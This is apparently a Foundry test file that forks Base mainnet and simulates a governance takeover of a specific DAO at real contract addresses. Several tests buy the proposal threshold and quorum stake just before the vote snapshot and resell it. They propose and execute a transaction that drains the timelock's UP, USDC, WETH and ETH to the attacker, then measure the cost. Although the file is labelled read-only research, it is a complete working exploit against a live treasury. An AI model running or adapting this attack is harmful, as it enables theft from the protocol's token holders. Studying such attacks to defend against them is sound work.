// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";

/// Read-only research. Fork-only. No mainnet transaction is ever signed/sent.
/// Goal: measure (a) the exact cost of a 3,000,000 UP quorum stake, (b) the
/// round-trip loss if the proposal fails, (c) whether a 1-block snapshot hold
/// replaces the 4-day hold, and (d) the vote outcome with/without opposition.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function delegate(address) external;
    function getVotes(address) external view returns (uint256);
    function getPastVotes(address, uint256) external view returns (uint256);
}

interface IGovernor {
    function propose(address[] calldata, uint256[] calldata, bytes[] calldata, string calldata) external returns (uint256);
    function castVote(uint256, uint8) external returns (uint256);
    function queue(address[] calldata, uint256[] calldata, bytes[] calldata, bytes32) external returns (uint256);
    function cancel(address[] memory, uint256[] memory, bytes[] memory, bytes32) external returns (uint256);
    function execute(address[] calldata, uint256[] calldata, bytes[] calldata, bytes32) external payable returns (uint256);
    function state(uint256) external view returns (uint8);
    function quorum(uint256) external view returns (uint256);
    function votingDelay() external view returns (uint256);
    function votingPeriod() external view returns (uint256);
    function proposalThreshold() external view returns (uint256);
    function clock() external view returns (uint48);
    function getVotes(address, uint256) external view returns (uint256);
}

interface ITimelock {
    function getMinDelay() external view returns (uint256);
    function hasRole(bytes32, address) external view returns (bool);
}

interface IWETH {
    function deposit() external payable;
    function approve(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface ISwapRouter02 {
    struct ExactOutputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 amountOut;
        uint256 amountInMaximum;
        uint160 sqrtPriceLimitX96;
    }
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }
    function exactOutputSingle(ExactOutputSingleParams calldata) external payable returns (uint256);
    function exactInputSingle(ExactInputSingleParams calldata) external payable returns (uint256);
}

contract UnlockActivityTest is Test {
    address constant GOV = 0x65bA0624403Fc5Ca2b20479e9F626eD4D78E0aD9;
    address constant TL  = 0xB34567C4cA697b39F72e1a8478f285329A98ed1b;
    address constant UP  = 0xaC27fa800955849d6D17cC8952Ba9dD6EAA66187;
    address constant USDC = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
    address constant WETH = 0x4200000000000000000000000000000000000006;
    address constant ROUTER = 0x2626664c2603336E57B271c5C0b26F421741e481; // Uniswap V3 SwapRouter02 (Base)
    address constant POOL03 = 0x9EF81F4E2F2f15Ff1c0C3f8c9ECc636580025242;

    address constant DEPLOYER = 0x81Dd955D02D337DB81BA6c9C5F6213E647672052; // 59,735 UP (NOT 59.7M)
    address constant WHALE    = 0xF5C28ce24Acf47849988f147d5C75787c0103534; // 39.45M votes, votes only on contentious proposals
    address constant SAFE_UP  = 0x3074517c5F5428f42C74543C68001E0Ca86FE7dd; // 390.56M UP, undelegated (0 votes)

    address attacker = address(0xA77ACCE5);

    uint256 constant ETH_USD = 2121; // live DefiLlama, 2026-11-10; only used for display
    uint256 constant QUORUM = 3_000_000e18;
    uint256 constant THRESHOLD = 50_000e18;

    // Public endpoints only: the CI repo is public, so never risk printing a keyed RPC URL.
    function setUp() public {
        string[2] memory urls = [
            "https://base-rpc.publicnode.com",
            "https://mainnet.base.org"
        ];
        for (uint256 i = 0; i < urls.length; i++) {
            try vm.createSelectFork(urls[i]) { return; } catch {}
        }
        revert("no working public Base RPC");
    }

    function _usd(uint256 weth) internal pure returns (uint256) {
        return (weth * ETH_USD) / 1e18;
    }

    function _fundWeth(address who, uint256 amount) internal {
        vm.deal(who, amount);
        vm.prank(who);
        IWETH(WETH).deposit{value: amount}();
        vm.prank(who);
        IWETH(WETH).approve(ROUTER, type(uint256).max);
    }

    function _buyUp(address who, uint256 amountUp, uint256 maxWeth) internal returns (uint256 spent) {
        vm.prank(who);
        spent = ISwapRouter02(ROUTER).exactOutputSingle(
            ISwapRouter02.ExactOutputSingleParams({
                tokenIn: WETH, tokenOut: UP, fee: 3000, recipient: who,
                amountOut: amountUp, amountInMaximum: maxWeth, sqrtPriceLimitX96: 0
            })
        );
    }

    function _sellUp(address who, uint256 amountUp) internal returns (uint256 received) {
        vm.prank(who);
        IERC20(UP).approve(ROUTER, type(uint256).max);
        vm.prank(who);
        received = ISwapRouter02(ROUTER).exactInputSingle(
            ISwapRouter02.ExactInputSingleParams({
                tokenIn: UP, tokenOut: WETH, fee: 3000, recipient: who,
                amountIn: amountUp, amountOutMinimum: 0, sqrtPriceLimitX96: 0
            })
        );
    }

    function _drainProposal(address to) internal view returns (address[] memory t, uint256[] memory v, bytes[] memory c) {
        uint256 upBal = IERC20(UP).balanceOf(TL);
        uint256 usdcBal = IERC20(USDC).balanceOf(TL);
        uint256 wethBal = IERC20(WETH).balanceOf(TL);
        uint256 ethBal = TL.balance;
        t = new address[](4);
        v = new uint256[](4);
        c = new bytes[](4);
        t[0] = UP;   v[0] = 0; c[0] = abi.encodeCall(IERC20.transfer, (to, upBal));
        t[1] = USDC; v[1] = 0; c[1] = abi.encodeCall(IERC20.transfer, (to, usdcBal));
        t[2] = WETH; v[2] = 0; c[2] = abi.encodeCall(IERC20.transfer, (to, wethBal));
        t[3] = to;   v[3] = ethBal; c[3] = "";
    }

    // ------------------------------------------------------------------
    // 1. Live state + the ca3 correction
    // ------------------------------------------------------------------
    function test_01_liveState() public {
        emit log_named_uint("fork block", block.number);
        emit log_named_uint("fork timestamp", block.timestamp);

        assertEq(IGovernor(GOV).quorum(block.timestamp - 1), QUORUM, "quorum 3M");
        assertEq(IGovernor(GOV).proposalThreshold(), THRESHOLD, "threshold 50k");
        assertEq(IGovernor(GOV).votingDelay(), 345600, "votingDelay 4d");
        assertEq(IGovernor(GOV).votingPeriod(), 518400, "votingPeriod 6d");
        assertEq(ITimelock(TL).getMinDelay(), 172800, "minDelay 2d");
        assertEq(IGovernor(GOV).clock(), uint48(block.timestamp), "timestamp clock");

        uint256 depBal = IERC20(UP).balanceOf(DEPLOYER);
        uint256 depVotes = IERC20(UP).getVotes(DEPLOYER);
        emit log_named_uint("deployer UP balance", depBal);
        emit log_named_uint("deployer UP votes", depVotes);
        // CORRECTION: ca3 said 59,735,099.46 UP; the live value is 59,735.099462 UP.
        assertLt(depBal, 100_000e18, "deployer is a minnow (<100k UP), not 59.7M");
        assertEq(depVotes, depBal, "deployer self-delegated");

        uint256 whaleVotes = IERC20(UP).getVotes(WHALE);
        emit log_named_uint("whale 0xf5c2... votes", whaleVotes);
        assertGt(whaleVotes, 39_000_000e18, "whale >39M votes");

        uint256 safeBal = IERC20(UP).balanceOf(SAFE_UP);
        uint256 safeVotes = IERC20(UP).getVotes(SAFE_UP);
        emit log_named_uint("Safe 0x3074... UP balance", safeBal);
        emit log_named_uint("Safe 0x3074... votes", safeVotes);
        assertGt(safeBal, 390_000_000e18, "Safe holds 390M UP");
        assertEq(safeVotes, 0, "Safe never delegated");

        emit log_named_uint("timelock UP", IERC20(UP).balanceOf(TL));
        emit log_named_uint("timelock ETH", TL.balance);
        emit log_named_uint("timelock USDC", IERC20(USDC).balanceOf(TL));
        emit log_named_uint("timelock WETH", IERC20(WETH).balanceOf(TL));
        emit log_named_uint("pool UP", IERC20(UP).balanceOf(POOL03));
        emit log_named_uint("pool WETH", IERC20(WETH).balanceOf(POOL03));
    }

    // ------------------------------------------------------------------
    // 2. Acquisition cost + round trip, 3M UP (= quorum)
    // ------------------------------------------------------------------
    function test_02_roundTrip_3M() public {
        _fundWeth(attacker, 20 ether);
        uint256 w0 = IERC20(WETH).balanceOf(attacker);
        uint256 spent = _buyUp(attacker, QUORUM, 20 ether);
        uint256 upGot = IERC20(UP).balanceOf(attacker);
        emit log_named_uint("buy 3M UP: WETH spent", spent);
        emit log_named_uint("buy 3M UP: USD", _usd(spent));
        assertEq(upGot, QUORUM, "got exactly 3M");

        vm.warp(block.timestamp + 2);
        uint256 received = _sellUp(attacker, QUORUM);
        uint256 w1 = IERC20(WETH).balanceOf(attacker);
        emit log_named_uint("sell 3M UP: WETH received", received);
        emit log_named_uint("sell 3M UP: USD", _usd(received));
        emit log_named_uint("round-trip loss WETH", spent - received);
        emit log_named_uint("round-trip loss USD", _usd(spent - received));
        assertEq(w1, w0 - spent + received, "WETH accounting");
        assertGt(received, (spent * 98) / 100, "round trip loses only fees (<2%)");
    }

    // ------------------------------------------------------------------
    // 3. Acquisition cost + round trip, 50k UP (= proposal threshold)
    // ------------------------------------------------------------------
    function test_03_roundTrip_50k() public {
        _fundWeth(attacker, 2 ether);
        uint256 spent = _buyUp(attacker, THRESHOLD, 2 ether);
        emit log_named_uint("buy 50k UP: WETH spent", spent);
        emit log_named_uint("buy 50k UP: USD", _usd(spent));
        vm.warp(block.timestamp + 2);
        uint256 received = _sellUp(attacker, THRESHOLD);
        emit log_named_uint("sell 50k UP: WETH received", received);
        emit log_named_uint("round-trip loss USD", _usd(spent - received));
    }

    // ------------------------------------------------------------------
    // 4. Acquisition cost of the observed opposition levels
    //    6.58M = min Against on a capture attempt; 13.69M = latest
    // ------------------------------------------------------------------
    function test_04_buy_6_58M_and_13_69M() public {
        _fundWeth(attacker, 400 ether);
        uint256 s1 = _buyUp(attacker, 6_580_303e18, 400 ether);
        emit log_named_uint("buy 6.58M UP: WETH", s1);
        emit log_named_uint("buy 6.58M UP: USD", _usd(s1));
        vm.warp(block.timestamp + 2);
        uint256 r1 = _sellUp(attacker, 6_580_303e18);
        emit log_named_uint("sell 6.58M UP: WETH", r1);
        emit log_named_uint("round-trip 6.58M loss USD", _usd(s1 - r1));

        // 13.69M is ~94% of the pool's UP; may revert if the range is exhausted.
        try this.externalBuySell(13_690_000e18, 400 ether) returns (uint256 s2, uint256 r2) {
            emit log_named_uint("buy 13.69M UP: WETH", s2);
            emit log_named_uint("buy 13.69M UP: USD", _usd(s2));
            emit log_named_uint("sell 13.69M UP: WETH", r2);
            emit log_named_uint("round-trip 13.69M loss USD", _usd(s2 - r2));
        } catch {
            emit log("13.69M buy/sell reverted (pool range/liquidity exhausted)");
        }
    }

    function externalBuySell(uint256 amount, uint256 maxWeth) external returns (uint256 spent, uint256 received) {
        require(msg.sender == address(this), "self only");
        spent = _buyUp(attacker, amount, maxWeth);
        vm.warp(block.timestamp + 2);
        received = _sellUp(attacker, amount);
    }

    // ------------------------------------------------------------------
    // 5. Snapshot timing: acquire in the snapshot-1 block, sell next block
    // ------------------------------------------------------------------
    function test_05_oneBlockSnapshotHold() public {
        _fundWeth(attacker, 20 ether);
        // 50k threshold: buy at T, delegate, propose at T+2 (needs votes at clock()-1)
        _buyUp(attacker, THRESHOLD, 2 ether);
        vm.prank(attacker);
        IERC20(UP).delegate(attacker);

        vm.warp(block.timestamp + 2);
        (address[] memory t, uint256[] memory v, bytes[] memory c) = _drainProposal(attacker);
        string memory desc = "unlock-activity test: one-block snapshot hold";
        vm.prank(attacker);
        uint256 pid = IGovernor(GOV).propose(t, v, c, desc);

        uint256 snap = IGovernor(GOV).clock() + IGovernor(GOV).votingDelay();
        emit log_named_uint("snapshot", snap);

        // buy 3M in the block immediately before the snapshot
        vm.warp(snap - 2);
        uint256 spent = _buyUp(attacker, QUORUM, 20 ether);
        emit log_named_uint("3M bought WETH", spent);
        emit log_named_uint("votes at snapshot-2", IERC20(UP).getVotes(attacker));

        // snapshot block, then sell in the very next block
        vm.warp(snap);
        vm.warp(snap + 2);
        uint256 received = _sellUp(attacker, QUORUM);
        emit log_named_uint("3M sold WETH", received);
        emit log_named_uint("attacker UP after sale", IERC20(UP).balanceOf(attacker));

        // vote later in the 6-day window
        vm.warp(snap + 4);
        vm.prank(attacker);
        uint256 weight = IGovernor(GOV).castVote(pid, 1);
        emit log_named_uint("vote weight (For)", weight);
        assertGe(weight, QUORUM, "1-block hold gives full 3M vote weight");
        assertGe(IERC20(UP).getPastVotes(attacker, snap), QUORUM, "past votes at snapshot >= 3M");
        assertLt(IERC20(UP).balanceOf(attacker), 100_000e18, "stake sold immediately after snapshot");
        emit log_named_uint("round-trip loss USD", _usd(spent - received));
        emit log_named_uint("state after vote", IGovernor(GOV).state(pid));
    }

    // ------------------------------------------------------------------
    // 6. Same-block flash loan: buy + sell in the snapshot block -> 0 votes
    // ------------------------------------------------------------------
    function test_06_flashloanSameBlockFails() public {
        _fundWeth(attacker, 20 ether);
        _buyUp(attacker, THRESHOLD, 2 ether);
        vm.prank(attacker);
        IERC20(UP).delegate(attacker);
        vm.warp(block.timestamp + 2);
        (address[] memory t, uint256[] memory v, bytes[] memory c) = _drainProposal(attacker);
        string memory desc = "unlock-activity test: same-block flash loan";
        vm.prank(attacker);
        uint256 pid = IGovernor(GOV).propose(t, v, c, desc);

        uint256 snap = IGovernor(GOV).clock() + IGovernor(GOV).votingDelay();
        vm.warp(snap - 2);
        _buyUp(attacker, QUORUM, 20 ether);
        _sellUp(attacker, QUORUM); // same block/timestamp -> checkpoint overwritten
        vm.warp(snap + 4);
        uint256 past = IERC20(UP).getPastVotes(attacker, snap);
        emit log_named_uint("past votes at snapshot after same-block round trip", past);
        assertLt(past, THRESHOLD + 1e18, "same-block flash loan leaves no votes");

        vm.prank(attacker);
        uint256 weight = IGovernor(GOV).castVote(pid, 1);
        emit log_named_uint("vote weight", weight);
        assertLt(weight, QUORUM, "cannot vote 3M from a same-block flash loan");
    }

    // ------------------------------------------------------------------
    // 7. Threshold timing: same-block propose fails; 1-block hold works
    // ------------------------------------------------------------------
    function test_07_thresholdTiming() public {
        _fundWeth(attacker, 2 ether);
        _buyUp(attacker, THRESHOLD, 2 ether);
        vm.prank(attacker);
        IERC20(UP).delegate(attacker);
        (address[] memory t, uint256[] memory v, bytes[] memory c) = _drainProposal(attacker);
        string memory desc = "unlock-activity test: threshold timing";

        // same block: getVotes(proposer, clock()-1) does not see this block's checkpoint
        vm.prank(attacker);
        vm.expectRevert();
        IGovernor(GOV).propose(t, v, c, desc);

        // next block: works
        vm.warp(block.timestamp + 2);
        vm.prank(attacker);
        uint256 pid = IGovernor(GOV).propose(t, v, c, desc);
        emit log_named_uint("proposal id", pid);

        // sell the 50k immediately; the proposal survives with no escrow
        vm.warp(block.timestamp + 2);
        _sellUp(attacker, THRESHOLD);
        emit log_named_uint("attacker UP after selling threshold", IERC20(UP).balanceOf(attacker));
        assertLt(IERC20(UP).balanceOf(attacker), 1e18, "threshold sold");
        assertEq(uint8(IGovernor(GOV).state(pid)), 0, "proposal still Pending, no deposit/escrow");
    }

    // ------------------------------------------------------------------
    // 8. Whale votes Against -> Defeated; measure the failure cost
    // ------------------------------------------------------------------
    function test_08_whaleAgainst_Defeated() public {
        _fundWeth(attacker, 20 ether);
        _buyUp(attacker, THRESHOLD, 2 ether);
        vm.prank(attacker);
        IERC20(UP).delegate(attacker);
        vm.warp(block.timestamp + 2);
        (address[] memory t, uint256[] memory v, bytes[] memory c) = _drainProposal(attacker);
        string memory desc = "unlock-activity test: whale against";
        vm.prank(attacker);
        uint256 pid = IGovernor(GOV).propose(t, v, c, desc);
        uint256 snap = IGovernor(GOV).clock() + IGovernor(GOV).votingDelay();

        vm.warp(snap - 2);
        uint256 spent = _buyUp(attacker, QUORUM, 20 ether);
        vm.warp(snap + 2);
        uint256 received = _sellUp(attacker, QUORUM);
        uint256 loss = spent - received;

        vm.warp(snap + 4);
        vm.prank(attacker);
        uint256 aw = IGovernor(GOV).castVote(pid, 1);
        vm.prank(WHALE);
        uint256 ww = IGovernor(GOV).castVote(pid, 0);
        emit log_named_uint("attacker For weight", aw);
        emit log_named_uint("whale Against weight", ww);

        vm.warp(snap + IGovernor(GOV).votingPeriod() + 1);
        uint8 st = IGovernor(GOV).state(pid);
        emit log_named_uint("state (3=Defeated)", st);
        assertEq(st, 3, "Defeated by the 39.4M whale");
        emit log_named_uint("FAILURE COST: round-trip loss WETH", loss);
        emit log_named_uint("FAILURE COST: round-trip loss USD", _usd(loss));
        assertLt(loss, spent / 100, "loss < 1% of principal");

        // queue must revert
        bytes32 dh = keccak256(bytes(desc));
        vm.expectRevert();
        IGovernor(GOV).queue(t, v, c, dh);
        emit log("queue reverted as expected");
    }

    // ------------------------------------------------------------------
    // 9. Deployer (59,735 UP) votes Against -> still Succeeds
    // ------------------------------------------------------------------
    function test_09_deployerAgainst_stillSucceeds() public {
        _fundWeth(attacker, 20 ether);
        _buyUp(attacker, THRESHOLD, 2 ether);
        vm.prank(attacker);
        IERC20(UP).delegate(attacker);
        vm.warp(block.timestamp + 2);
        (address[] memory t, uint256[] memory v, bytes[] memory c) = _drainProposal(attacker);
        string memory desc = "unlock-activity test: deployer against";
        vm.prank(attacker);
        uint256 pid = IGovernor(GOV).propose(t, v, c, desc);
        uint256 snap = IGovernor(GOV).clock() + IGovernor(GOV).votingDelay();

        vm.warp(snap - 2);
        _buyUp(attacker, QUORUM, 20 ether);
        vm.warp(snap + 2);
        _sellUp(attacker, QUORUM);
        vm.warp(snap + 4);
        vm.prank(attacker);
        uint256 aw = IGovernor(GOV).castVote(pid, 1);
        vm.prank(DEPLOYER);
        uint256 dw = IGovernor(GOV).castVote(pid, 0);
        emit log_named_uint("attacker For", aw);
        emit log_named_uint("deployer Against", dw);
        vm.warp(snap + IGovernor(GOV).votingPeriod() + 1);
        uint8 st = IGovernor(GOV).state(pid);
        emit log_named_uint("state (4=Succeeded)", st);
        assertEq(st, 4, "59,735 Against cannot stop 3M For");
    }

    // ------------------------------------------------------------------
    // 10. Unopposed 3M -> passes, executes, drains the timelock
    // ------------------------------------------------------------------
    function test_10_unopposed_passesAndExecutes() public {
        _fundWeth(attacker, 20 ether);
        _buyUp(attacker, THRESHOLD, 2 ether);
        vm.prank(attacker);
        IERC20(UP).delegate(attacker);
        vm.warp(block.timestamp + 2);
        (address[] memory t, uint256[] memory v, bytes[] memory c) = _drainProposal(attacker);
        string memory desc = "unlock-activity test: unopposed";
        vm.prank(attacker);
        uint256 pid = IGovernor(GOV).propose(t, v, c, desc);
        uint256 snap = IGovernor(GOV).clock() + IGovernor(GOV).votingDelay();

        vm.warp(snap - 2);
        uint256 spent = _buyUp(attacker, QUORUM, 20 ether);
        vm.warp(snap + 2);
        uint256 received = _sellUp(attacker, QUORUM);
        uint256 cost = spent - received;

        uint256 upBal = IERC20(UP).balanceOf(TL);
        uint256 usdcBal = IERC20(USDC).balanceOf(TL);
        uint256 wethBal = IERC20(WETH).balanceOf(TL);
        uint256 ethBal = TL.balance;
        emit log_named_uint("prize UP", upBal);
        emit log_named_uint("prize ETH", ethBal);
        emit log_named_uint("prize USDC", usdcBal);
        emit log_named_uint("prize WETH", wethBal);

        vm.warp(snap + 4);
        vm.prank(attacker);
        uint256 aw = IGovernor(GOV).castVote(pid, 1);
        emit log_named_uint("For weight", aw);
        vm.warp(snap + IGovernor(GOV).votingPeriod() + 1);
        assertEq(uint8(IGovernor(GOV).state(pid)), 4, "Succeeded");
        bytes32 dh = keccak256(bytes(desc));
        IGovernor(GOV).queue(t, v, c, dh);
        vm.warp(block.timestamp + ITimelock(TL).getMinDelay() + 1);
        IGovernor(GOV).execute(t, v, c, dh);
        assertEq(uint8(IGovernor(GOV).state(pid)), 7, "Executed");

        assertEq(IERC20(UP).balanceOf(TL), 0, "UP drained");
        assertEq(IERC20(USDC).balanceOf(TL), 0, "USDC drained");
        assertEq(IERC20(WETH).balanceOf(TL), 0, "WETH drained");
        assertEq(TL.balance, 0, "ETH drained");
        emit log_named_uint("attacker UP", IERC20(UP).balanceOf(attacker));

        // realise the UP leg by dumping it into the live pool
        uint256 wethBefore = IERC20(WETH).balanceOf(attacker);
        try this.externalSellAll(upBal) {
            uint256 wethAfter = IERC20(WETH).balanceOf(attacker);
            emit log_named_uint("UP leg realised WETH", wethAfter - wethBefore);
            emit log_named_uint("UP leg realised USD", _usd(wethAfter - wethBefore));
        } catch {
            emit log("UP dump reverted (range exhausted) - see analytic estimate");
        }
        // Final balances: the 20 WETH float minus the round-trip cost, plus the prize.
        emit log_named_uint("attacker ETH (prize)", attacker.balance);
        emit log_named_uint("attacker WETH (float+prize+UP leg)", IERC20(WETH).balanceOf(attacker));
        emit log_named_uint("attacker USDC (prize)", IERC20(USDC).balanceOf(attacker));
        emit log_named_uint("attacker UP (unsold)", IERC20(UP).balanceOf(attacker));
        emit log_named_uint("acquisition round-trip cost WETH", cost);
        emit log_named_uint("acquisition round-trip cost USD", _usd(cost));
    }

    function externalSellAll(uint256 amount) external {
        require(msg.sender == address(this), "self only");
        _sellUp(attacker, amount);
    }

    // ------------------------------------------------------------------
    // 11. Cancel window: proposer can cancel only while Pending (4-day delay)
    // ------------------------------------------------------------------
    function test_11_cancelWindow() public {
        _fundWeth(attacker, 2 ether);
        _buyUp(attacker, THRESHOLD, 2 ether);
        vm.prank(attacker);
        IERC20(UP).delegate(attacker);
        vm.warp(block.timestamp + 2);
        (address[] memory t, uint256[] memory v, bytes[] memory c) = _drainProposal(attacker);

        string memory d1 = "unlock-activity test: cancel pending";
        vm.prank(attacker);
        uint256 p1 = IGovernor(GOV).propose(t, v, c, d1);
        bytes32 h1 = keccak256(bytes(d1));
        vm.prank(attacker);
        IGovernor(GOV).cancel(t, v, c, h1);
        emit log_named_uint("state after pending cancel (2=Canceled)", IGovernor(GOV).state(p1));
        assertEq(uint8(IGovernor(GOV).state(p1)), 2, "proposer canceled while Pending");

        // second proposal: after the snapshot the proposer can no longer cancel
        string memory d2 = "unlock-activity test: cancel too late";
        vm.prank(attacker);
        uint256 p2 = IGovernor(GOV).propose(t, v, c, d2);
        bytes32 h2 = keccak256(bytes(d2));
        uint256 snap = IGovernor(GOV).clock() + IGovernor(GOV).votingDelay();
        vm.warp(snap + 1);
        assertEq(uint8(IGovernor(GOV).state(p2)), 1, "Active");
        vm.prank(attacker);
        vm.expectRevert();
        IGovernor(GOV).cancel(t, v, c, h2);
        emit log("cancel reverted after voting started (no CANCELLER_ROLE anywhere)");
    }
}
